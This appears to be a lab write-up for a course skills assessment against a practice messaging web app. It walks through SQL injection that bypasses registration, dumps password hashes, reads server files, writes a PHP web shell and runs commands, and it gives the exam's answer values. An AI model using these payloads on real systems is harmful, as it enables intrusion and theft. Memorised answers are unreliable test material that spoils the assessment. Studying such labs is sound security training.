# Section 17 — Skills Assessment

**Scenario:** Black-box pentest of chattr GmbH's HTTPS messaging web app. No source code provided.

---

## Reconnaissance

The app runs over HTTPS (nginx). Bypass SSL in curl with `-k` / `--no-check-certificate`.

```bash
curl -sk "https://TARGET_IP:PORT/" | grep -oP '(href|action)="[^"]*"'
```

**Pages found:** `/login.php`, `/register.php`, `/api/login.php`, `/api/register.php`

---

## Step 1 — Bypass Registration (invitationCode SQLi)

The registration form requires an invitation code. Single quote → 500 error = injectable.

```bash
# Bypass invitation code check
curl -sk "https://TARGET_IP:PORT/api/register.php" \
  -d "username=pwner&password=Password1&repeatPassword=Password1&invitationCode=' OR '1'='1"

# Log in and capture session cookie
curl -sk "https://TARGET_IP:PORT/api/login.php" \
  -d "username=pwner&password=Password1" \
  -D - -c /tmp/cookies.txt
```

---

## Step 2 — Find Direct-Output Injection (q= parameter)

After login, the app shows a messaging interface at `/?u=<id>&q=<search>`. The `q=` search parameter is injectable and reflects UNION results as messages.

**Column count:** 4 (confirmed via ORDER BY or `UNION SELECT NULL,NULL,NULL,NULL`)

**Visible column:** 4 (rightmost — appears as message content)

```bash
# Confirm injection — single quote breaks query
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" --data-urlencode "q='"

# Confirm UNION works — 'MARKER' appears as a chat message
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,'MARKER'-- -"
```

---

## Q1 — Admin Password Hash

```bash
# Enumerate databases
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,schema_name FROM information_schema.schemata-- -"
# → chattr

# Enumerate tables in chattr
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,TABLE_NAME FROM information_schema.TABLES WHERE table_schema='chattr'-- -"
# → Users, Messages, invitationcodes

# Enumerate columns in Users
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,COLUMN_NAME FROM information_schema.COLUMNS WHERE table_name='Users'-- -"
# → UserID, Username, Password, InvitationCode, AccountCreated

# Dump admin hash
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,Password FROM chattr.Users WHERE Username='admin'-- -"
```

**Q1 Answer:** `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`

> Hash algorithm: Argon2i — not crackable by standard hashcat wordlist attacks.

---

## Q2 — Webroot Path

```bash
# Read nginx config to get document root
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -"
```

**Nginx config (relevant excerpt):**
```
server {
    listen 443 ssl;
    server_name chattr.htb;
    root /var/www/chattr-prod;
    ...
}
```

**Q2 Answer:** `/var/www/chattr-prod`

---

## Q3 — Remote Code Execution via Web Shell

```bash
# Write PHP web shell to webroot
curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
  -G --data-urlencode "u=1" \
  --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,'<?php system(\$_REQUEST[0]); ?>' INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -"

# Confirm RCE
curl -sk "https://TARGET_IP:PORT/shell.php?0=id"
# → uid=33(www-data) gid=33(www-data)

# Find and read flag
curl -sk "https://TARGET_IP:PORT/shell.php?0=find+/+-maxdepth+4+-name+flag*+2>/dev/null"
# → /flag_876a4c.txt

curl -sk "https://TARGET_IP:PORT/shell.php?0=cat+/flag_876a4c.txt"
```

**Q3 Answer:** `061b1aeb94dec6bf5d9c27032b3c1d8d`

---

## sqlmap Shortcut (once injection confirmed)

```bash
# Dump Users table
sqlmap -u "https://TARGET_IP:PORT/index.php?u=1&q=hello" \
  --cookie="PHPSESSID=..." \
  --dbms=mysql --batch --no-cast -p q --technique=U \
  -D chattr -T Users -C Username,Password --dump

# Read file
sqlmap ... --sql-query="SELECT LOAD_FILE('/etc/nginx/sites-enabled/default')"

# Write shell
sqlmap ... --file-write=/tmp/shell.php --file-dest=/var/www/chattr-prod/shell.php
```

---

## Full Attack Chain Summary

```
1. Register: invitationCode=' OR '1'='1  → bypasses invitation check
2. Login: get PHPSESSID cookie
3. q= search parameter: UNION injection (4 cols, col 4 visible)
4. Enumerate: information_schema → chattr → Users → Username,Password
5. Dump: admin Argon2i hash
6. Read file: LOAD_FILE('/etc/nginx/sites-enabled/default') → webroot = /var/www/chattr-prod
7. Write shell: INTO OUTFILE '/var/www/chattr-prod/shell.php'
8. RCE: /shell.php?0=cat+/flag_XXXXXX.txt
```

---

## Exam Notes

- Always look for direct-output injection after authenticating — blind SQLi is 10-100x slower
- The `q=` search parameter used a LIKE query with `'%INPUT%'` — inject with `') UNION...-- -` to escape the closing `'%`
- `LOAD_FILE` on `/etc/nginx/sites-enabled/default` reliably reveals webroot without needing `@@datadir`
- Argon2i hashes are PHP's modern password_hash() format — practically uncrackable; focus on obtaining the hash as proof, not cracking it
- MySQL `INTO OUTFILE` in a UNION writes the entire result set to the file — use `NULL` padding and put shell content in the last column for a clean file
